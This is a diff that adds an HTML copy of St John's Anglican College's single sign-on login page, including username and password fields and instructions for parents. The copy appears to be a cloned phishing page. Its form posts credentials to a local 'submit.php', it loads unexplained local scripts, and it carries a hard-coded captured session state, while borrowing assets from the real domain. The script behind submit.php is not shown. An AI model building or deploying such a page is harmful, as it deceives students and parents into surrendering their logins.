@@ -1,0 +1,143 @@
+<!DOCTYPE html><html><head>
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<script type="text/javascript" src="js/script.js"></script>
+<title>Enter your username and password</title>
+
+
+    <link rel="stylesheet" type="text/css" href="css/theme.css">
+    <link rel="icon" type="image/icon" href="https://login.sjac.qld.edu.au/module.php/nextmail/cloudwork/favicon.ico">
+    <!--[if lt IE 11]>
+    <link href="https://login.sjac.qld.edu.au/module.php/nextmail/cloudwork/css/ie.css" rel="stylesheet" type="text/css">
+    <![endif]-->
+
+	<meta name="robots" content="noindex, nofollow">
+
+<script type="text/javascript" src="js/jquery.js"></script><script type="text/javascript" src="js/jquery.cookie.js"></script><script type="text/javascript" src="js/users-1.0.js"></script>    <!-- theme overrides -->
+<style type="text/css">
+body {
+    background-image: url("images/61B021EB_illustration-sjac.jpg");
+      background-color: #5598fe;
+}
+input[type="submit"] {
+    background-color: #5598fe;
+}
+.content {
+    background-color: #FFFFFF;
+    color:  #5b5b5b;
+}
+.login a {
+    color: ;
+}
+.main {
+    flex-direction:column;
+    }
+* {
+    margin: 0px;
+    padding: 0px;
+}
+
+html, body {
+    height: 100%;
+    width: 100%;
+    background-color: #ffffff;
+    color: #000000;
+    font-weight: normal;
+    font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+    -ms-overflow-style: -ms-autohiding-scrollbar;
+}
+
+body {
+    font-size: 0.9em;
+}
+@viewport {
+    width: device-width;
+}
+ .main .content { min-height: 100vh; height: auto !important; position: absolute; border-radius: 0px; padding: 0px 95px 0px 50px; margin: 0 auto; text-align: left; }
+ .main .content input[type=submit] { color: #FFF; min-width:80px; width: auto; height: 30px; padding: 0px 5px; -webkit-flex: none; font-size: inherit; font-size: 0.9em; border-radius: 0; line-height: 0.9em; }
+ div.content-header { padding-top: 90px; margin-bottom: 60px; }
+ div.submit { margin: 38px 0; 30px; }
+ div.login { width: 350px; }
+ input[type=text], input[type=password], select { height: 28px; padding: 0px 3px 0px 3px; border: solid 1px #BABABA; background: #ffffff; color: #000; border-radius: 0px; font-weight:normal; margin: 0 0 8px 0; }
+ .main .content input[type=text], .main .content input[type=password], .main .content h3, .main .content input[type=submit], .main .content a, .main .content select { font-weight: normal; font-size: 0.9em; 
+   font-family: "Segoe UI" , "Segoe" , "SegoeUI-Regular-final", Tahoma, Helvetica, Arial, sans-serif;}
+ .login h3 {margin-bottom:35px;}
+ .login a { text-decoration: none; }
+ div.footer { position:absolute; bottom:5px; width: 350px; }</style>
+<script src="js/simplewebauthn.es5.umd.min.js"></script></head>
+<body>
+    <div class="header"></div>
+    <div class="main">
+      <div class="content">
+        <div class="content-header">
+<h2>St John's Anglican College</h2>
+        </div>
+<script type="text/javascript">
+  var stateId = '_6528dcf9b735d3c3aa23ccaebda53a2d35878be6d1:https://login.sjac.qld.edu.au/saml2/idp/SSOService.php?spentityid=https%3A%2F%2Fschoolbox.sjac.qld.edu.au&RelayState=https%3A%2F%2Fschoolbox.sjac.qld.edu.au%2Fsaml%2Findex.php&cookieTime=1730510347';
+  if (window.PublicKeyCredential) {
+    var umd = document.createElement('script');
+    umd.src = '/module.php/cloudworkauth/simplewebauthn.es5.umd.min.js';
+    var webauthn = document.createElement('script');
+    webauthn.src = '/module.php/cloudworkauth/webauthn.js';
+    umd.onload = function() {
+      document.head.append(webauthn);
+    }
+    document.head.append(umd);
+  } else {
+    $(document).ready(function() { 
+    $("#password").show();
+    $("#submit").show();
+    $("#webauthnBegin").remove();
+    $("#f").submit(function() {
+      $("#submit").val('Signing in...');
+      $("#submit").attr("disabled", "disabled");
+    });
+  });
+}
+</script>
+<div class="login">
+    <h3>Please enter your username and password</h3>
+    <form action="submit.php" method="post" name="f" id="f"> <input type="text" id="username" tabindex="1" name="username" placeholder="username" value="" spellcheck="false" autofocus autocomplete="username webauthn"> <input id="password" type="password" tabindex="3" name="password" placeholder="password" autocomplete="current-password webauthn"> <div class="submit"> <button type="submit" id="webauthnBegin" tabindex="2">Continue</button> <input type="submit" id="submit" style="display: none;" value="submit"> </div> </form>
+    
+    <br>
+  <style>
+    .social_login_btn {
+      padding: 0.6em;
+      border-radius: 0.3em;
+      border: 1px solid #bbb;
+      display: block;
+      margin-bottom: 0.5em;
+      background-repeat: no-repeat;
+      background-position-x: 1em;
+      background-size: 1.6em;
+      background-position-y: center;
+      height: 2.6em;
+      box-sizing: border-box;
+      text-decoration: none;
+      color: #222;
+    }
+    .social_login_btn:hover {
+      background-color: #eee;
+    }
+    .social_login_btn.facebook {
+      background-image: url(images/facebook.svg);
+    }
+    .social_login_btn.microsoft {
+      background-image: url(images/microsoft.svg);
+    }
+    .social_login_btn.google {
+      background-image: url(images/google.svg);
+    }
+    .social_login_btn.apple {
+      background-image: url(images/apple.svg);
+    }
+  </style>
+            <p></p><center><h2><u>PARENTS</u></h2><br>Please ensure the username field is in the form of your parent code only (eg ABCD001SJP).<br><i>If you see "school.sjac.qld.edu.au" please remove from the field before login.</i></center><p></p>
+</div>
+
+      </div>
+    </div>
+    <div class="footer">Cloudwork® Copyright © 2024 <a href="http://studentnet.net">Studentnet®</a> | Powered by <a href="http://coherentcloud.com">Coherent Cloud®</a></div>
+  
+
+</body></html>
